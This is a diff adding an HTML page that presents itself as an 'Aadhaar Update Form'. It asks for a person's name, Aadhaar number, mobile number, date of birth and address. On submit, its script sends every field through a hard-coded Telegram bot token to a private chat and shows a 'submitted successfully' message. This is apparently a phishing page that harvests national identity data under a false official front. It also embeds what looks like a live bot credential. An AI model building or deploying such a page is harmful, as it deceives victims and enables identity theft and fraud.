@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Aadhaar Update Form</title>
+</head>
+<body>
+  <h2>Aadhaar Update Form</h2>
+  <form id="aadharForm">
+    <label>Full Name:</label><br>
+    <input type="text" name="name" required><br><br>
+
+    <label>Aadhaar Number:</label><br>
+    <input type="text" name="aadhar" required><br><br>
+
+    <label>Mobile Number:</label><br>
+    <input type="text" name="mobile" required><br><br>
+
+    <label>Date of Birth:</label><br>
+    <input type="date" name="dob" required><br><br>
+
+    <label>Address:</label><br>
+    <textarea name="address" rows="4" required></textarea><br><br>
+
+    <button type="submit">Submit</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('aadharForm');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const formData = new FormData(form);
+      const name = formData.get('name');
+      const aadhar = formData.get('aadhar');
+      const mobile = formData.get('mobile');
+      const dob = formData.get('dob');
+      const address = formData.get('address');
+
+      const message = `📝 *New Aadhaar Update Form Submission*\n\n👤 *Name:* ${name}\n🔢 *Aadhaar:* ${aadhar}\n📞 *Mobile:* ${mobile}\n🎂 *DOB:* ${dob}\n🏠 *Address:* ${address}`;
+
+      const botToken = '7641600096:AAF2KShllYD6MKx2rZ_aIOwqDdF4hi1rJTc';
+      const chatId = '6861912709';
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert("Form submitted successfully!");
+        form.reset();
+      })
+      .catch(error => {
+        alert("Error sending message to Telegram.");
+        console.error(error);
+      });
+    });
+  </script>
+</body>
+</html>
